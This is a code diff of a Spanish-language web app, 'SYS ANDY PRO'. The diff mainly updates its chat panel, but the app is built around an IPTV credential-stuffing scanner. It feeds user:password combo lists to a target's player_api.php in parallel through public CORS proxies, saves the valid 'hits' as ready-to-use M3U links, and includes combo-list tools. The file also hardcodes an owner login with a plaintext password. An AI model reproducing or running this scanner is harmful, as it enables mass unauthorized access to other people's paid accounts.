@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>SYS ANDY PRO - LEÓN ROJO + JUEGO + RECUPERACIÓN</title>
+    <title>SYS ANDY PRO - LEÓN ROJO + JUEGO + CHAT FUNCIONAL</title>
     <style>
         /* ========== PALETA ORIGINAL LEÓN ROJO + NEGRO (TEMA DÍA) ========== */
         :root {
@@ -58,7 +58,6 @@
             .chat-input-area { flex-direction: column; }
         }
 
-        /* Resto de estilos (igual que original pero con variables) */
         body::before {
             content: "";
             position: fixed;
@@ -126,10 +125,24 @@
         #hitsContainer { background: rgba(30, 5, 5, 0.7); padding: 10px; border-radius: 25px; max-height: 300px; overflow-y: auto; border: 2px solid #ff4422; }
         .hit-block { background: rgba(0,0,0,0.85); border: 2px solid #ff5533; border-radius: 20px; padding: 12px; margin-bottom: 12px; }
         .chat-container { background: rgba(0,0,0,0.7); border-radius: 20px; padding: 15px; border: 2px solid #ff4422; }
-        .chat-messages { height: 400px; overflow-y: auto; background: #1a0303; border-radius: 15px; margin-bottom: 15px; }
+        .chat-messages { height: 400px; overflow-y: auto; background: #1a0303; border-radius: 15px; margin-bottom: 15px; display: flex; flex-direction: column; gap: 10px; padding: 10px; }
         .chat-message { background: #2a0a0a; border-radius: 15px; padding: 8px 12px; border-left: 5px solid var(--user-color, #ff8844); position: relative; }
-        .message-actions { position: absolute; top: 5px; right: 8px; opacity: 0; transition: opacity 0.2s; }
+        body.theme-night .chat-message { background: #1e293b; }
+        .message-header { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+        .message-avatar { font-size: 1.2rem; background: #000; border-radius: 50%; width: 28px; height: 28px; display: inline-flex; align-items: center; justify-content: center; }
+        .message-name { font-weight: bold; color: var(--user-color, #ffaa66); }
+        .message-time { font-size: 0.7rem; color: #ffaa88; }
+        .message-text { color: #ffddcc; word-break: break-word; white-space: pre-wrap; }
+        .reply-preview { background: #3a1a0a; border-radius: 10px; padding: 5px; margin-bottom: 5px; font-size: 0.8rem; border-left: 3px solid #ffaa33; }
+        .message-actions { position: absolute; top: 5px; right: 8px; display: flex; gap: 8px; opacity: 0; transition: opacity 0.2s; }
         .chat-message:hover .message-actions { opacity: 1; }
+        .msg-btn { background: none; border: none; color: #ffaa88; cursor: pointer; font-size: 0.8rem; }
+        .chat-input-area { display: flex; gap: 10px; align-items: flex-end; flex-wrap: wrap; }
+        .chat-input { flex: 1; background: #1f0808; border: 2px solid #aa4422; border-radius: 25px; padding: 10px 15px; color: white; resize: none; }
+        .reply-badge { background: #ff4422; color: white; border-radius: 20px; padding: 4px 10px; display: inline-flex; align-items: center; gap: 8px; margin-bottom: 5px; }
+        .profile-config { background: #1a0505; border-radius: 20px; padding: 10px; margin-bottom: 15px; display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
+        .avatar-select { font-size: 1.5rem; background: #000; border-radius: 50%; width: 40px; height: 40px; text-align: center; line-height: 40px; cursor: pointer; }
+        .mention { background: #ff4422; color: white; border-radius: 12px; padding: 0 5px; cursor: pointer; }
         /* JUEGO */
         .game-container { background: rgba(0,0,0,0.6); border-radius: 30px; padding: 20px; border: 2px solid #ff4422; }
         .game-stats { display: flex; justify-content: space-between; margin-bottom: 20px; font-size: 1.5rem; font-weight: bold; }
@@ -212,7 +225,7 @@
         <div id="listaUrlsContainer" class="item-list"></div>
     </div>
 
-    <!-- COMBOS (resumido pero funcional igual que original) -->
+    <!-- COMBOS -->
     <div id="panel-combos" class="panel">
         <h3>📦 HERRAMIENTA DE COMBOS</h3>
         <div class="sub-tabs"><button class="sub-tab active" data-sub="generator">Generador</button><button class="sub-tab" data-sub="merge">Unir Combos</button><button class="sub-tab" data-sub="dedupe">Eliminar Duplicados</button></div>
@@ -254,11 +267,11 @@
     <!-- SOLICITUDES -->
     <div id="panel-solicitudes" class="panel"><h3>📋 Solicitudes Pendientes</h3><div id="solicitudesContainer"></div></div>
 
-    <!-- CHAT -->
+    <!-- CHAT (corregido) -->
     <div id="panel-chat" class="panel">
         <h3>💬 CHAT GENERAL</h3>
-        <div class="profile-config"><div class="avatar-select" id="avatarSelect">🦁</div><input type="text" id="displayName" maxlength="20"><button class="btn-small btn-action" id="saveProfileBtn">Guardar</button></div>
-        <div class="chat-container"><div class="chat-messages" id="chatMessages"></div><div class="reply-badge" id="replyBadge" style="display:none;"><span>Respondiendo...</span><button id="cancelReplyBtn">❌</button></div><div class="chat-input-area"><textarea id="chatInput" class="chat-input" rows="2"></textarea><button id="sendMsgBtn" class="btn-small btn-start">📤</button></div></div>
+        <div class="profile-config"><div class="avatar-select" id="avatarSelect">🦁</div><input type="text" id="displayName" maxlength="20" placeholder="Tu nombre"><button class="btn-small btn-action" id="saveProfileBtn">Guardar</button></div>
+        <div class="chat-container"><div class="chat-messages" id="chatMessages"></div><div class="reply-badge" id="replyBadge" style="display:none;"><span>Respondiendo...</span><button id="cancelReplyBtn">❌</button></div><div class="chat-input-area"><textarea id="chatInput" class="chat-input" rows="2" placeholder="Escribe tu mensaje... @nombre para mencionar"></textarea><button id="sendMsgBtn" class="btn-small btn-start">📤 Enviar</button></div></div>
     </div>
 
     <!-- JUEGO -->
@@ -287,9 +300,9 @@
     const db = firebase.database();
 
     let currentUser = null, usernameClave = "";
-    let activeAbortControllers = []; // Para detener peticiones fetch
+    let activeAbortControllers = [];
 
-    // EmailJS (opcional, igual que antes)
+    // EmailJS
     const EMAILJS_PUBLIC_KEY = "TU_PUBLIC_KEY_AQUI";
     const EMAILJS_SERVICE_ID = "TU_SERVICE_ID_AQUI";
     const EMAILJS_TEMPLATE_ID = "TU_TEMPLATE_ID_AQUI";
@@ -297,7 +310,7 @@
 
     function limpiarClaveLocal(str){ return str.toLowerCase().trim().replace(/[\.\$\#\[\]\@]/g, "_"); }
 
-    // ========== LOGIN / REGISTRO / ADMIN ==========
+    // ========== LOGIN / REGISTRO / ADMIN (sin cambios) ==========
     document.querySelectorAll('.auth-tab').forEach(t=>t.addEventListener('click',function(){let target=this.getAttribute('data-auth');document.querySelectorAll('.auth-tab').forEach(t=>t.classList.remove('active'));this.classList.add('active');document.querySelectorAll('.auth-panel').forEach(p=>p.classList.remove('active'));document.getElementById(`auth-${target}`).classList.add('active');}));
     function procesarLogin(){let email=document.getElementById('loginEmail').value.trim().toLowerCase(),pass=document.getElementById('loginPass').value.trim();if(!email||!pass){alert("Complete");return;}if((email==="andy"||email==="andyobregon799@gmail.com")&&pass==="andy799"){ingresarAlSistema(email,"Owner");return;}let nodo=limpiarClaveLocal(email);db.ref("vendedores/"+nodo).once("value").then(snap=>{if(snap.exists()&&snap.val().pass===pass)ingresarAlSistema(snap.val().email,"Seller");else alert("Credencial incorrecta");});}
     async function ingresarAlSistema(email,rol){currentUser={email,role:rol,uid:limpiarClaveLocal(email)};usernameClave=currentUser.uid;document.getElementById('auth-screen').style.display='none';document.getElementById('main-app').style.display='block';document.getElementById('userDisplay').textContent=`Activo: ${email} (${rol})`;if(rol==="Owner"){document.getElementById('tabAdminBtn').style.display='block';document.getElementById('tabSolicitudesBtn').style.display='block';escucharVendedores();escucharSolicitudesRegistro();}else{document.getElementById('tabAdminBtn').style.display='none';document.getElementById('tabSolicitudesBtn').style.display='none';}if(!localStorage.getItem('sys_urls'))localStorage.setItem('sys_urls',JSON.stringify({}));if(!localStorage.getItem('sys_saved_hits'))localStorage.setItem('sys_saved_hits',JSON.stringify({}));renderizarUrlsBloc();renderizarBancoHits();switchTab('combos');await cargarPerfilUsuario(email);iniciarChat();}
@@ -319,13 +332,13 @@
     async function solicitarCodigoReset(){let email=document.getElementById('resetEmail').value.trim().toLowerCase();if(!email){alert("Ingresa correo");return;}let nodo=limpiarClaveLocal(email);let snap=await db.ref(`vendedores/${nodo}`).once('value');if(!snap.exists()){alert("No existe cuenta");return;}let code=generarCodigo();let expiresAt=Date.now()+5*60*1000;await db.ref(`reset_codes/${nodo}`).set({code,expiresAt,email});resetEmailTemp=email;if(EMAILJS_PUBLIC_KEY!=="TU_PUBLIC_KEY_AQUI"&&EMAILJS_SERVICE_ID!=="TU_SERVICE_ID_AQUI"&&EMAILJS_TEMPLATE_ID!=="TU_TEMPLATE_ID_AQUI"){try{await emailjs.send(EMAILJS_SERVICE_ID,EMAILJS_TEMPLATE_ID,{to_email:email,code:code,subject:"Código recuperación"});document.getElementById('resetMsg').innerHTML='<span style="color:#00cc66;">✅ Código enviado</span>';document.getElementById('resetStep1').style.display='none';document.getElementById('resetStep2').style.display='block';}catch(err){document.getElementById('resetMsg').innerHTML='<span style="color:#ff6666;">Error EmailJS</span>';}}else{console.warn("Código:",code);alert(`[DEMO] Código: ${code}`);document.getElementById('resetMsg').innerHTML='<span>⚠️ Modo demo</span>';document.getElementById('resetStep1').style.display='none';document.getElementById('resetStep2').style.display='block';}}
     async function verificarCodigoYResetear(){let code=document.getElementById('resetCode').value.trim(),newPass=document.getElementById('newPassword').value.trim(),confirmPass=document.getElementById('confirmNewPassword').value.trim();if(!code||!newPass||!confirmPass){alert("Complete");return;}if(newPass.length<4){alert("Mínimo 4");return;}if(newPass!==confirmPass){alert("No coinciden");return;}let email=resetEmailTemp;if(!email){alert("Reinicia proceso");resetModal.style.display='none';return;}let nodo=limpiarClaveLocal(email);let snap=await db.ref(`reset_codes/${nodo}`).once('value');if(!snap.exists()){alert("Código inválido");return;}let data=snap.val();if(Date.now()>data.expiresAt){alert("Expirado");await db.ref(`reset_codes/${nodo}`).remove();return;}if(data.code!==code){alert("Código incorrecto");return;}await db.ref(`vendedores/${nodo}`).update({pass:newPass});await db.ref(`reset_codes/${nodo}`).remove();alert("Contraseña restablecida");resetModal.style.display='none';document.getElementById('loginEmail').value=email;}
 
-    // ========== BLOC URLS ==========
+    // ========== BLOC URLS (sin cambios) ==========
     function guardarUrlBloc(){let val=document.getElementById('inputUrlData').value.trim(),editId=document.getElementById('editUrlId').value;if(!val)return;let base=JSON.parse(localStorage.getItem('sys_urls'))||{};if(!base[usernameClave])base[usernameClave]=[];if(editId!==""){base[usernameClave][parseInt(editId)]=val;document.getElementById('editUrlId').value="";}else base[usernameClave].push(val);localStorage.setItem('sys_urls',JSON.stringify(base));document.getElementById('inputUrlData').value="";renderizarUrlsBloc();}
     function renderizarUrlsBloc(){let base=JSON.parse(localStorage.getItem('sys_urls'))||{},cont=document.getElementById('listaUrlsContainer');cont.innerHTML='';let mis=base[usernameClave]||[];if(mis.length===0){cont.innerHTML='<p>No hay URLs</p>';return;}mis.forEach((url,idx)=>{let div=document.createElement('div');div.className='item-card';div.innerHTML=`<div>🌐 ${url}</div><div class="item-actions"><button class="btn-small btn-copy" onclick="usarUrlEscanner(${idx})">🔌 Escanear</button><button class="btn-small btn-del" onclick="eliminarUrl(${idx})">Eliminar</button></div>`;cont.appendChild(div);});}
     function usarUrlEscanner(idx){let base=JSON.parse(localStorage.getItem('sys_urls'));document.getElementById('hostInput').value=base[usernameClave][idx].split(" - ")[0].trim();switchTab('scanner');}
     function eliminarUrl(idx){let base=JSON.parse(localStorage.getItem('sys_urls'));base[usernameClave].splice(idx,1);localStorage.setItem('sys_urls',JSON.stringify(base));renderizarUrlsBloc();}
 
-    // ========== BANCO HITS ==========
+    // ========== BANCO HITS (sin cambios) ==========
     function guardarHitEnBanco(texto,user,pass){let base=JSON.parse(localStorage.getItem('sys_saved_hits'))||{};if(!base[usernameClave])base[usernameClave]=[];if(base[usernameClave].some(h=>h.user===user&&h.pass===pass))return;let ahora=new Date();base[usernameClave].push({id:Date.now()+Math.random(),user,pass,texto,copies:0,fecha:ahora.toLocaleString(),timestamp:ahora.getTime()});localStorage.setItem('sys_saved_hits',JSON.stringify(base));renderizarBancoHits();}
     function renderizarBancoHits(){let base=JSON.parse(localStorage.getItem('sys_saved_hits'))||{},cont=document.getElementById('bancoHitsContainer');cont.innerHTML='';let mis=base[usernameClave]||[];if(mis.length===0){cont.innerHTML='<p>Sin hits</p>';return;}mis.sort((a,b)=>(b.timestamp||0)-(a.timestamp||0));mis.forEach(h=>{let div=document.createElement('div');div.className='hit-block';div.innerHTML=`<div class="hit-header"><span>👤 ${h.user}</span><span class="counter-badge">Copias: ${h.copies||0}</span></div><div class="hit-date">📅 ${h.fecha}</div><pre class="hit-content">${h.texto}</pre><div class="item-actions"><button class="btn-small btn-copy" onclick="copiarHitConContador(${h.id})">📋 Copiar</button><button class="btn-small btn-del" onclick="borrarHitBanco(${h.id})">Eliminar</button></div>`;cont.appendChild(div);});}
     function copiarHitConContador(id){let base=JSON.parse(localStorage.getItem('sys_saved_hits'));let item=base[usernameClave].find(h=>h.id==id);if(item){item.copies=(item.copies||0)+1;localStorage.setItem('sys_saved_hits',JSON.stringify(base));navigator.clipboard.writeText(item.texto);renderizarBancoHits();}}
@@ -341,44 +354,208 @@
     function descargarDedupeResultado(){let txt=document.getElementById('dedupeResultado').value;if(!txt)return;let blob=new Blob([txt],{type:'text/plain'});let a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='dedupe.txt';a.click();}
     document.querySelectorAll('.sub-tab').forEach(btn=>{btn.addEventListener('click',()=>{let subId=btn.getAttribute('data-sub');document.querySelectorAll('.sub-tab').forEach(b=>b.classList.remove('active'));btn.classList.add('active');document.querySelectorAll('.sub-panel').forEach(p=>p.classList.remove('active'));document.getElementById(`sub-${subId}`).classList.add('active');});});
 
-    // ========== ESCÁNER CON DETENER MEJORADO (AbortController) ==========
+    // ========== ESCÁNER (con detener mejorado, igual que antes) ==========
     let moanAudioContext=null;let isRunning=false,stopRequested=false;
     let combos1=[],combos2=[],combos3=[],combosTxt=[];
-    let currentAbortControllers=[]; // para cancelar fetch
-
+    let currentAbortControllers=[];
     function playMoanSound(){if(!document.getElementById('soundToggle').checked)return;try{if(!moanAudioContext)moanAudioContext=new(window.AudioContext||window.webkitAudioContext)();if(moanAudioContext.state==='suspended')moanAudioContext.resume();let now=moanAudioContext.currentTime,osc=moanAudioContext.createOscillator(),gain=moanAudioContext.createGain();osc.connect(gain);gain.connect(moanAudioContext.destination);osc.type='sine';osc.frequency.setValueAtTime(400,now);osc.frequency.exponentialRampToValueAtTime(800,now+0.15);osc.frequency.exponentialRampToValueAtTime(300,now+0.35);gain.gain.setValueAtTime(0.3,now);gain.gain.exponentialRampToValueAtTime(0.0001,now+0.8);osc.start();osc.stop(now+0.8);if(navigator.vibrate)navigator.vibrate(200);}catch(e){}}
     const CORS_PROXIES=['https://api.allorigins.win/raw?url={url}','https://corsproxy.io/?{url}','https://api.codetabs.com/v1/proxy/?quest={url}'];const PROXY_FAILS=new Map();const MAX_FAILS=2,COOLDOWN_MS=30000;
     function isProxyOnCooldown(tpl){let d=PROXY_FAILS.get(tpl);return d&&d.until&&Date.now()<d.until;}
     function markProxyFail(tpl){let d=PROXY_FAILS.get(tpl)||{fails:0,until:0};d.fails++;if(d.fails>=MAX_FAILS){d.until=Date.now()+COOLDOWN_MS;d.fails=0;}PROXY_FAILS.set(tpl,d);}
     function markProxySuccess(tpl){PROXY_FAILS.delete(tpl);}
     async function fetchWithCors(url,options={},intentos=3){if(stopRequested) throw new Error("Detenido");const opts={cache:'no-store',...options};if(!document.getElementById('useCors').checked){let r=await fetch(url,opts);if(r.ok)return r;throw new Error('Direct fail');}let proxies=CORS_PROXIES.filter(tpl=>!isProxyOnCooldown(tpl));if(proxies.length===0)proxies=[...CORS_PROXIES];for(let tpl of proxies){if(stopRequested) throw new Error("Detenido");try{let proxied=tpl.replace('{url}',encodeURIComponent(url));let res=await fetch(proxied,opts);if(res&&res.ok){markProxySuccess(tpl);return res;}else markProxyFail(tpl);}catch(e){markProxyFail(tpl);}}if(intentos>1&&!stopRequested){await new Promise(r=>setTimeout(r,1000));return fetchWithCors(url,options,intentos-1);}throw new Error('All proxies failed');}
-
     function extractCombo(line){let m=line.trim().match(/([^:\s]+)\s*:\s*([^:\s]+)/);return m?[m[1].trim(),m[2].trim()]:null;}
     const hostInput=document.getElementById('hostInput'),concurrencyInput=document.getElementById('concurrencyInput'),startBtn=document.getElementById('startBtn'),stopBtn=document.getElementById('stopBtn'),saveBtn=document.getElementById('saveBtn');
     const comboText=document.getElementById('comboText'),comboFile1=document.getElementById('comboFile1'),comboFile2=document.getElementById('comboFile2'),comboFile3=document.getElementById('comboFile3'),hitsContainer=document.getElementById('hitsContainer');
     const HITS={1:[],2:[],3:[]};
     function updateStartState(){const hasHost=!!hostInput.value.trim();startBtn.disabled=!(hasHost&&(combos1.length||combos2.length||combos3.length||combosTxt.length));}
-    async function processarCombosJob(host,combos,conc,jobId){let total=combos.length,processed=0,index=0;const fill=document.getElementById(jobId===1?'progressBarFill':(jobId===2?'progressBarFill2':'progressBarFill3'));const txt=document.getElementById(jobId===1?'progressText':(jobId===2?'progressText2':'progressText3'));const userDisp=document.getElementById(jobId===1?'currentCombo':(jobId===2?'currentCombo2':'currentCombo3'));const countSpan=document.getElementById(jobId===1?'hitsCount1':(jobId===2?'hitsCount2':'hitsCount3'));async function worker(){while(index<total&&!stopRequested){const i=index++;if(i>=total)break;const pair=extractCombo(combos[i]);if(!pair)continue;const[user,pass]=pair;userDisp.textContent=`Usuario: ${user}:${pass}`;const abortController=new AbortController();currentAbortControllers.push(abortController);try{const url=`http://${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;const res=await fetchWithCors(url,{signal:abortController.signal,cache:'no-store'});const data=await res.json();if(data&&data.user_info&&(data.user_info.status==='Active'||data.user_info.auth==1)){playMoanSound();const info=data.user_info;const expDate=info.exp_date?new Date(info.exp_date*1000).toLocaleString('sv-SE'):'Ilimitado';let liveChannels=0,movies=0,series=0;if(data.available_channels&&Array.isArray(data.available_channels))liveChannels=data.available_channels.length;else if(data.total_channels)liveChannels=data.total_channels;else if(data.channels_count)liveChannels=data.channels_count;if(data.movies_count)movies=data.movies_count;else if(data.total_movies)movies=data.total_movies;if(data.series_count)series=data.series_count;else if(data.total_series)series=data.total_series;let infoExtra="";if(liveChannels>0)infoExtra+=`├── 📺 Canales ➤ ${liveChannels}\n`;if(movies>0)infoExtra+=`├── 🎬 Películas ➤ ${movies}\n`;if(series>0)infoExtra+=`├── 📺 Series ➤ ${series}\n`;const texto=`Host ➤ http://${host}\n├── Dominio ➤ http://${host.split(':')[0]}\n├── User ➤ ${user}\n├── Pass ➤ ${pass}\n├── Exp. ➤ ${expDate}\n├── Act Con ➤ ${info.active_cons||0}\n├── Max Con ➤ ${info.max_connections||"N/A"}\n├── Status ➤ ${info.status}\n${infoExtra}╰─➤ Zona ➤ ${info.timezone||"N/A"}\n\n╭─➤ 🄼➂🅄 \n├  http://${host}/get.php?username=${user}&password=${pass}&type=m3u_plus`;HITS[jobId].push({user,pass,texto});countSpan.innerHTML=`Hits: <span class="yellow-hit">${HITS[jobId].length}</span>`;const div=document.createElement('div');div.className='hit-block';div.innerHTML=`<div class="hit-header">👤 ${user} : ${pass}</div><pre class="hit-content">${texto}</pre>`;hitsContainer.prepend(div);guardarHitEnBanco(texto,user,pass);}}catch(e){if(e.name==='AbortError'){console.log("Fetch abortado");}}finally{processed++;fill.style.width=((processed/total)*100)+'%';txt.textContent=`Procesados: ${processed} / ${total}`;const indexToRemove=currentAbortControllers.indexOf(abortController);if(indexToRemove!==-1)currentAbortControllers.splice(indexToRemove,1);}}}await Promise.all(Array.from({length:conc},()=>worker()));}
+    async function processarCombosJob(host,combos,conc,jobId){let total=combos.length,processed=0,index=0;const fill=document.getElementById(jobId===1?'progressBarFill':(jobId===2?'progressBarFill2':'progressBarFill3'));const txt=document.getElementById(jobId===1?'progressText':(jobId===2?'progressText2':'progressText3'));const userDisp=document.getElementById(jobId===1?'currentCombo':(jobId===2?'currentCombo2':'currentCombo3'));const countSpan=document.getElementById(jobId===1?'hitsCount1':(jobId===2?'hitsCount2':'hitsCount3'));async function worker(){while(index<total&&!stopRequested){const i=index++;if(i>=total)break;const pair=extractCombo(combos[i]);if(!pair)continue;const[user,pass]=pair;userDisp.textContent=`Usuario: ${user}:${pass}`;const abortController=new AbortController();currentAbortControllers.push(abortController);try{const url=`http://${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;const res=await fetchWithCors(url,{signal:abortController.signal,cache:'no-store'});const data=await res.json();if(data&&data.user_info&&(data.user_info.status==='Active'||data.user_info.auth==1)){playMoanSound();const info=data.user_info;const expDate=info.exp_date?new Date(info.exp_date*1000).toLocaleString('sv-SE'):'Ilimitado';let liveChannels=0,movies=0,series=0;if(data.available_channels&&Array.isArray(data.available_channels))liveChannels=data.available_channels.length;else if(data.total_channels)liveChannels=data.total_channels;else if(data.channels_count)liveChannels=data.channels_count;if(data.movies_count)movies=data.movies_count;else if(data.total_movies)movies=data.total_movies;if(data.series_count)series=data.series_count;else if(data.total_series)series=data.total_series;let infoExtra="";if(liveChannels>0)infoExtra+=`├── 📺 Canales ➤ ${liveChannels}\n`;if(movies>0)infoExtra+=`├── 🎬 Películas ➤ ${movies}\n`;if(series>0)infoExtra+=`├── 📺 Series ➤ ${series}\n`;const texto=`Host ➤ http://${host}\n├── Dominio ➤ http://${host.split(':')[0]}\n├── User ➤ ${user}\n├── Pass ➤ ${pass}\n├── Exp. ➤ ${expDate}\n├── Act Con ➤ ${info.active_cons||0}\n├── Max Con ➤ ${info.max_connections||"N/A"}\n├── Status ➤ ${info.status}\n${infoExtra}╰─➤ Zona ➤ ${info.timezone||"N/A"}\n\n╭─➤ 🄼➂🅄 \n├  http://${host}/get.php?username=${user}&password=${pass}&type=m3u_plus`;HITS[jobId].push({user,pass,texto});countSpan.innerHTML=`Hits: <span class="yellow-hit">${HITS[jobId].length}</span>`;const div=document.createElement('div');div.className='hit-block';div.innerHTML=`<div class="hit-header">👤 ${user} : ${pass}</div><pre class="hit-content">${texto}</pre>`;hitsContainer.prepend(div);guardarHitEnBanco(texto,user,pass);}}catch(e){}finally{processed++;fill.style.width=((processed/total)*100)+'%';txt.textContent=`Procesados: ${processed} / ${total}`;const idx=currentAbortControllers.indexOf(abortController);if(idx!==-1)currentAbortControllers.splice(idx,1);}}}await Promise.all(Array.from({length:conc},()=>worker()));}
     function readTxtFile(inputEl,targetArray){targetArray.length=0;const f=inputEl.files?.[0];if(!f){updateStartState();return;}const r=new FileReader();r.onload=e=>{String(e.target.result).split(/\r?\n/).forEach(l=>{if(extractCombo(l))targetArray.push(l);});updateStartState();};r.readAsText(f);}
     comboFile1.addEventListener('change',()=>readTxtFile(comboFile1,combos1));comboFile2.addEventListener('change',()=>readTxtFile(comboFile2,combos2));comboFile3.addEventListener('change',()=>readTxtFile(comboFile3,combos3));comboText.addEventListener('input',()=>{combosTxt.length=0;comboText.value.split(/\r?\n/).forEach(l=>{if(extractCombo(l))combosTxt.push(l);});updateStartState();});hostInput.addEventListener('input',updateStartState);
     startBtn.addEventListener('click',async()=>{if(isRunning)return;if(moanAudioContext&&moanAudioContext.state==='suspended')await moanAudioContext.resume();isRunning=true;stopRequested=false;startBtn.disabled=true;stopBtn.disabled=false;saveBtn.disabled=true;if(combosTxt.length){combos1=combos1.concat(combosTxt);combosTxt=[];}const host=hostInput.value.replace(/^https?:\/\//,'').trim();const conc=parseInt(concurrencyInput.value)||80;const jobs=[];if(combos1.length)jobs.push(processarCombosJob(host,combos1,Math.floor(conc/3)||20,1));if(combos2.length)jobs.push(processarCombosJob(host,combos2,Math.floor(conc/3)||20,2));if(combos3.length)jobs.push(processarCombosJob(host,combos3,Math.floor(conc/3)||20,3));Promise.allSettled(jobs).then(()=>{isRunning=false;stopBtn.disabled=true;startBtn.disabled=false;saveBtn.disabled=false;if(document.getElementById('autoDownload').checked){const allHits=[...HITS[1],...HITS[2],...HITS[3]];if(allHits.length){let content=allHits.map(h=>h.texto).join('\n\n================\n\n');const blob=new Blob([content],{type:'text/plain'});const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=`scan_${host}_${new Date().toISOString().slice(0,19)}.txt`;a.click();a.remove();}}});});
     stopBtn.addEventListener('click',()=>{stopRequested=true;for(let ctrl of currentAbortControllers)ctrl.abort();currentAbortControllers=[];});
     saveBtn.addEventListener('click',()=>{const allHits=[...HITS[1],...HITS[2],...HITS[3]];if(!allHits.length){alert("No hay hits");return;}let content=allHits.map(h=>h.texto).join('\n\n================\n\n');const blob=new Blob([content],{type:'text/plain'});const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=`scan_${hostInput.value.replace(/[^a-z0-9]/gi,'_')}_${Date.now()}.txt`;a.click();a.remove();});updateStartState();
 
-    // ========== CHAT ==========
-    let chatDisplayName="",chatAvatar="🦁",currentReplyTo=null;let chatUnsubscribe=null;
-    function getUserColor(email){let hash=0;for(let i=0;i<email.length;i++)hash=((hash<<5)-hash)+email.charCodeAt(i);return `hsl(${Math.abs(hash%360)}, 70%, 60%)`;}
-    async function cargarPerfilUsuario(email){let ref=db.ref(`chat_profiles/${currentUser.uid}`);let snap=await ref.once('value');if(snap.exists()){chatDisplayName=snap.val().name||email.split('@')[0];chatAvatar=snap.val().avatar||"🦁";}else{chatDisplayName=email.split('@')[0];chatAvatar="🦁";await ref.set({name:chatDisplayName,avatar:chatAvatar});}document.getElementById('displayName').value=chatDisplayName;document.getElementById('avatarSelect').textContent=chatAvatar;}
-    document.getElementById('saveProfileBtn').addEventListener('click',async()=>{let newName=document.getElementById('displayName').value.trim();if(newName)chatDisplayName=newName;chatAvatar=document.getElementById('avatarSelect').textContent;await db.ref(`chat_profiles/${currentUser.uid}`).set({name:chatDisplayName,avatar:chatAvatar});alert("Perfil actualizado");});
-    document.getElementById('avatarSelect').addEventListener('click',()=>{let newEmoji=prompt("Elige un emoji:",chatAvatar);if(newEmoji&&newEmoji.trim())document.getElementById('avatarSelect').textContent=newEmoji.trim();});
-    function iniciarChat(){if(chatUnsubscribe)chatUnsubscribe();let messagesRef=db.ref('chat_messages').orderByChild('timestamp').limitToLast(200);chatUnsubscribe=messagesRef.on('value',(snap)=>{let messages=[];snap.forEach(c=>messages.push({id:c.key,...c.val()}));messages.sort((a,b)=>(a.timestamp||0)-(b.timestamp||0));renderizarMensajes(messages);});}
-    async function renderizarMensajes(messages){let container=document.getElementById('chatMessages');if(!container)return;container.innerHTML='';for(let msg of messages){let userColor=getUserColor(msg.userId);let replyHtml=msg.replyTo?`<div class="reply-preview">↩️ Respondiendo a <strong>${escapeHtml(msg.replyTo.userName)}</strong>: ${escapeHtml(msg.replyTo.text.substring(0,50))}</div>`:'';let msgDiv=document.createElement('div');msgDiv.className=`chat-message ${msg.replyTo?'replying':''}`;msgDiv.style.setProperty('--user-color',userColor);msgDiv.dataset.id=msg.id;msgDiv.innerHTML=`<div class="message-header"><span class="message-avatar">${escapeHtml(msg.avatar||'🦁')}</span><span class="message-name" style="color:${userColor}">${escapeHtml(msg.userName)}</span><span class="message-time">${new Date(msg.timestamp).toLocaleString()}</span></div>${replyHtml}<div class="message-text">${formatMessageText(msg.text,msg.mentions||[])}</div><div class="message-actions"><button class="msg-btn reply-btn">💬</button>${(currentUser.role==='Owner'||msg.userId===currentUser.uid)?`<button class="msg-btn edit-btn">✏️</button><button class="msg-btn delete-btn">🗑️</button>`:''}</div>`;msgDiv.querySelector('.reply-btn').onclick=()=>{currentReplyTo={id:msg.id,userName:msg.userName,text:msg.text};document.getElementById('replyBadge').style.display='flex';document.getElementById('replyBadge').querySelector('span').innerHTML=`Respondiendo a ${escapeHtml(msg.userName)}`;};if(msgDiv.querySelector('.edit-btn'))msgDiv.querySelector('.edit-btn').onclick=()=>editarMensaje(msg.id,msg.text);if(msgDiv.querySelector('.delete-btn'))msgDiv.querySelector('.delete-btn').onclick=()=>eliminarMensaje(msg.id);container.appendChild(msgDiv);}container.scrollTop=container.scrollHeight;}
-    function escapeHtml(str){return str.replace(/[&<>]/g,function(m){if(m==='&')return '&amp;';if(m==='<')return '&lt;';if(m==='>')return '&gt;';return m;});}
-    function formatMessageText(text,mentions){let html=escapeHtml(text);mentions.forEach(m=>{let regex=new RegExp(`@${m.userName.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')}\\b`,'g');html=html.replace(regex,`<span class="mention">@${escapeHtml(m.userName)}</span>`);});return html;}
-    async function enviarMensaje(){let input=document.getElementById('chatInput'),text=input.value.trim();if(!text)return;let mentions=[];let mentionRegex=/@(\w+)/g;let match;while((match=mentionRegex.exec(text))!==null){let mentionedName=match[1];let snapshot=await db.ref('chat_profiles').once('value');let found=null;snapshot.forEach(prof=>{if(prof.val().name.toLowerCase()===mentionedName.toLowerCase())found={userId:prof.key,userName:prof.val().name};});if(found&&!mentions.some(m=>m.userId===found.userId))mentions.push(found);}let msgData={userId:currentUser.uid,userName:chatDisplayName,avatar:chatAvatar,text:text,timestamp:Date.now(),mentions:mentions};if(currentReplyTo){msgData.replyTo={id:currentReplyTo.id,userId:currentReplyTo.userId,userName:currentReplyTo.userName,text:currentReplyTo.text.substring(0,100)};currentReplyTo=null;document.getElementById('replyBadge').style.display='none';}await db.ref('chat_messages').push(msgData);input.value='';}
-    async function editarMensaje(msgId,oldText){let newText=prompt("Editar:",oldText);if(newText&&newText!==oldText)await db.ref(`chat_messages/${msgId}`).update({text:newText,edited:true});}
-    async function eliminarMensaje(msgId){if(confirm("Eliminar?"))await db.ref(`chat_messages/${msgId}`).remove();}
-    document.getElementById('sendMsgBtn').addEventListener('click',enviarMensaje);document.getElementById('chatInput').addEventListener('keypress',(e)=>{if(e.key==='Enter'&&!e.shiftKey){e.preventDefault();enviarMensaje();}});document.getElementById('cancelReplyBtn').addEventListener('click',()=>{currentReplyTo=null;document.getElementById('replyBadge').style.display='none';});function cargarMensajesChat(){}
